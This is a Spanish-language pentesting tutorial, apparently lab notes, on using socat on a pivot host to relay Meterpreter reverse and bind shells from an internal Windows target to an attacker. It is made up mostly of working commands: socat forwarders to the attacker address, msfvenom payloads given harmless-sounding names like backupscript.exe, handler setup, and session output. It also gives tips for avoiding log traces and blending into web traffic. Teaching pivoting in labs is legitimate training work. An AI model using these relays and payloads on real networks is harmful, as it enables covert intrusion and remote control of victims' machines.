# SOCAT

Socat es una herramienta de relay bidireccional que crea puentes entre dos canales de red independientes sin necesidad de SSH. En contexto de pivoting actúa como **redirector**: escucha en el pivot host y reenvía el tráfico al host atacante, permitiendo que un objetivo en una red interna alcance al atacante a través del pivot.

### Concepto

```
Objetivo Windows → pivot host (socat) → host atacante (listener)
172.16.5.19        172.16.5.129:8080      10.10.14.18:80
```

Socat recibe la conexión del objetivo y la retransmite transparentemente. El atacante solo ve tráfico proveniente del pivot, no del objetivo real.

### Reverse Shell via Socat

#### Paso 1 — Iniciar socat en el pivot host

```bash
# Escuchar en 8080, reenviar todo al atacante en puerto 80
socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```

| Opción                | Descripción                                                                        |
| --------------------- | ---------------------------------------------------------------------------------- |
| `TCP4-LISTEN:8080`    | Escuchar conexiones TCP entrantes en puerto 8080                                   |
| `fork`                | Crear un proceso hijo por cada conexión — permite conexiones múltiples simultáneas |
| `TCP4:10.10.14.18:80` | Reenviar al host atacante en puerto 80                                             |

#### Paso 2 — Generar payload para el objetivo Windows

El payload apunta al pivot host (`172.16.5.129:8080`), no al atacante directamente:

```bash
msfvenom -p windows/x64/meterpreter/reverse_https \
  LHOST=172.16.5.129 \
  LPORT=8080 \
  -f exe -o backupscript.exe
```

#### Paso 3 — Listener en el host atacante

El listener escucha en el puerto al que socat reenvía (80):

```bash
msf6> use exploit/multi/handler
msf6> set payload windows/x64/meterpreter/reverse_https
msf6> set LHOST 0.0.0.0
msf6> set LPORT 80
msf6> run
# [*] Started HTTPS reverse handler on https://0.0.0.0:80
```

#### Resultado

Cuando el objetivo ejecuta el payload, la conexión llega al pivot en `:8080`, socat la reenvía al atacante en `:80`, y el atacante recibe la sesión Meterpreter. La IP de origen que ve el listener es la del pivot host, no la del objetivo:

```
[*] Meterpreter session 1 opened (10.10.14.18:80 -> 127.0.0.1)
meterpreter> getuid
Server username: INLANEFREIGHT\victor
```

### Bind Shell via Socat

En el modelo bind shell el flujo es inverso: el objetivo escucha y el atacante conecta. Socat actúa como intermediario entre el handler del atacante y el bind shell del objetivo.

```
host atacante (handler) → pivot host (socat) → objetivo Windows (bind shell)
10.10.14.18               172.16.5.129:8080     172.16.5.19:8443
```

#### Paso 1 — Generar payload bind shell para Windows

```bash
msfvenom -p windows/x64/meterpreter/bind_tcp \
  LPORT=8443 \
  -f exe -o backupjob.exe
```

El payload no necesita `LHOST` — escuchará en el propio objetivo en el puerto indicado.

#### Paso 2 — Iniciar socat bind relay en el pivot host

```bash
# Escuchar en 8080, reenviar conexiones al objetivo en 8443
socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
```

#### Paso 3 — Ejecutar el payload en el objetivo Windows

Una vez ejecutado, el objetivo quedará escuchando en `172.16.5.19:8443`.

#### Paso 4 — Conectar desde el handler al pivot

El handler conecta al pivot (`:8080`), socat retransmite al bind shell del objetivo (`:8443`):

```bash
msf6> use exploit/multi/handler
msf6> set payload windows/x64/meterpreter/bind_tcp
msf6> set RHOST 10.129.202.64    # IP del pivot host
msf6> set LPORT 8080             # Puerto donde socat escucha
msf6> run
# [*] Started bind TCP handler against 10.129.202.64:8080
```

#### Resultado

```
[*] Sending stage (200262 bytes) to 10.129.202.64
[*] Meterpreter session 1 opened (10.10.14.18:46253 -> 10.129.202.64:8080)
meterpreter> getuid
Server username: INLANEFREIGHT\victor
```

### Comparativa reverse vs bind con Socat

|                    | Reverse Shell                          | Bind Shell                                                    |
| ------------------ | -------------------------------------- | ------------------------------------------------------------- |
| **Dirección**      | Objetivo → pivot → atacante            | Atacante → pivot → objetivo                                   |
| **Payload LHOST**  | IP del pivot                           | No necesario                                                  |
| **Socat en pivot** | `LISTEN` en pivot, reenvía al atacante | `LISTEN` en pivot, reenvía al objetivo                        |
| **Handler**        | Escucha pasivo                         | Conecta activamente al pivot                                  |
| **Uso típico**     | Más común, objetivo inicia conexión    | Útil cuando el objetivo no puede iniciar conexiones salientes |

### Verificación y uso práctico

```bash
# Verificar que socat está escuchando en el pivot
ss -tlnp | grep 8080
netstat -antp | grep 8080

# Socat en background (liberar terminal del pivot)
socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80 &

# Socat con logging para debug
socat -v TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```

> Socat es especialmente útil cuando SSH no está disponible en el pivot host o cuando se quiere un redirector más liviano que no deja rastro de túneles SSH en los logs del sistema. Combinado con payloads HTTPS, el tráfico redirigido parece tráfico web legítimo desde el pivot.

> **Atención:** Sin el flag `fork`, socat solo maneja una conexión y termina. Usar siempre `fork` si se esperan múltiples conexiones o staging de Meterpreter (que abre múltiples conexiones durante el proceso).

<br>
